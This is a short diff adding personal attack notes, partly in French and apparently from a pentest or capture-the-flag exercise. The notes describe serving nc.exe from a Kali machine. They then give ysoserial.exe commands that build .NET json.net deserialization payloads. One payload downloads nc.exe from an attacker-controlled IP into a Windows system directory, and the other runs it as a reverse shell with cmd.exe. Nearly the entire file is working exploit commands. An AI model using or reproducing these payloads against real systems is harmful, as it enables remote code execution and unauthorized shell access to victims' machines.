@@ -1,0 +1,6 @@
+on kali : 
+python -m SimpleHTTPServer dans le dossier où tu as nc.exe
+upload file:
+ysoserial.exe -f json.net -g WindowsIdentity -o base64 -c "powershell -c Invoke-WebRequest -Uri 'http://IP/nc.exe' -OutFile 'c:\windows\system32\spool\drivers\color\nc.exe'" -t
+revshell : 
+ysoserial.exe -f json.net -g WindowsIdentity -o base64 -c "c:\windows\system32\spool\drivers\color\nc.exe IP PORT -e cmd.exe" -t
